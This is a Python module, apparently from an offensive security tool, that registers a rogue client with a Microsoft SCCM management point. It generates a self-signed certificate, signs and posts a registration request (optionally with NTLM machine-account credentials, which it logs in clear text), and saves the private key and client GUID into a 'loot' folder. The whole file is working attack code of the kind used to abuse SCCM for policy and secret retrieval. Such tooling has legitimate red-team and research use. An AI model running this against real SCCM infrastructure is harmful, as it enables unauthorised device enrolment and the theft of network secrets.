import os
import zlib
import logging
import requests
import traceback
import xml.etree.ElementTree            as ET

from cryptography.hazmat.primitives     import serialization
from utils.requestTemplates             import registrationRequestTemplate, registrationRequestWrapperTemplate, SCCMHeaderTemplate
from datetime                           import datetime
from time                               import sleep
from utils.cryptoUtils                  import createPrivateKey, createCertificate, SCCMSign
from utils.miscUtils                    import encodeUTF16StripBOM
from requests_ntlm                      import HttpNtlmAuth
from requests_toolbelt.multipart        import decoder

from conf                               import bcolors, DATE_FORMAT

logger = logging.getLogger(__name__)

def generateRegistrationRequestPayload(management_point, public_key, private_key, client_name):
    registrationRequest = registrationRequestTemplate.format(
        date=datetime.now().strftime(DATE_FORMAT),
        encryption=public_key,
        signature=public_key,
        client=client_name.split('.')[0],
        clientfqdn=client_name
    )

    signature = SCCMSign(private_key, encodeUTF16StripBOM(registrationRequest)).hex().upper()
    registrationRequestWrapper = registrationRequestWrapperTemplate.format(
     data=registrationRequest,
     signature=signature
    )
    registrationRequestWrapper = encodeUTF16StripBOM(registrationRequestWrapper) + "\r\n".encode('ascii')

    registrationRequestHeader = SCCMHeaderTemplate.format(
        bodylength=len(registrationRequestWrapper)-2,
        client=client_name,
        date=datetime.now().strftime(DATE_FORMAT),
        sccmserver=management_point
    )

    final_body = "--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n".encode('ascii')
    final_body += registrationRequestHeader.encode('utf-16') + "\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n".encode('ascii')
    final_body += zlib.compress(registrationRequestWrapper) + "\r\n--aAbBcCdDv1234567890VxXyYzZ--".encode('ascii')

    return final_body


def registerClient(management_point, registration_request_payload, username=None, password=None):
    headers = {
        "Connection": "close",
        "User-Agent": "ConfigMgr Messaging HTTP Sender",
        "Content-Type": "multipart/mixed; boundary=\"aAbBcCdDv1234567890VxXyYzZ\""
    }

    if username is not None and password is not None:
        r = requests.request("CCM_POST", f"{management_point}/ccm_system_windowsauth/request", headers=headers, data=registration_request_payload, auth=HttpNtlmAuth(username, password))
    else:
        r = requests.request("CCM_POST", f"{management_point}/ccm_system/request", headers=headers, data=registration_request_payload)

    multipart_data = decoder.MultipartDecoder.from_response(r)
    for part in multipart_data.parts:
        if part.headers[b'content-type'] == b'application/octet-stream':
            return zlib.decompress(part.content).decode('utf-16')


def clientRegistration(management_point, username, password, machineAccountProvided, client_name, directory_name):
    # Client registration
    os.makedirs(f"loot/{directory_name}/device")
    # Generate certificate
    logger.info(f"[INFO] Generating Private key and client (self-signed) certificate")
    private_key = createPrivateKey()
    certificate = createCertificate(private_key)
    public_key = certificate.public_bytes(serialization.Encoding.DER).hex().upper()

    # Writing certs to device info directory
    with open(f"loot/{directory_name}/device/cert.pem", 'wb') as f:
        f.write(certificate.public_bytes(serialization.Encoding.PEM))
    with open(f"loot/{directory_name}/device/key.pem", 'wb') as f:
        f.write(private_key.private_bytes(encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.TraditionalOpenSSL, encryption_algorithm=serialization.NoEncryption()))

    # Perform registration    
    logger.warning(f"{bcolors.OKCYAN}\n[*] Registering SCCM client with FQDN {client_name}{bcolors.ENDC}")
    registration_request_payload = generateRegistrationRequestPayload(management_point, public_key, private_key, client_name)
    if machineAccountProvided:
        logger.warning(f"[*] Using authenticated registration, with username {username} and password {password}")
        register_response = registerClient(management_point, registration_request_payload, username, password)
    else:
        register_response = registerClient(management_point, registration_request_payload, None, None)
        
    # Parse registration response
    try:
        root = ET.fromstring(register_response[:-1])
        client_guid = root.attrib["SMSID"].split("GUID:")[1]
    except:
        traceback.print_exc()
        logger.error(f"{bcolors.FAIL}[-] Could not retrieve client GUID after registration. Exiting.{bcolors.ENDC}")
        return False

    with open(f"loot/{directory_name}/device/guid.txt", 'w') as f:
        f.write(f"{client_guid}\n")

    logger.warning(f"{bcolors.OKGREEN}[+] Client registration complete - GUID: {client_guid}.{bcolors.ENDC}")
    return private_key, client_guid
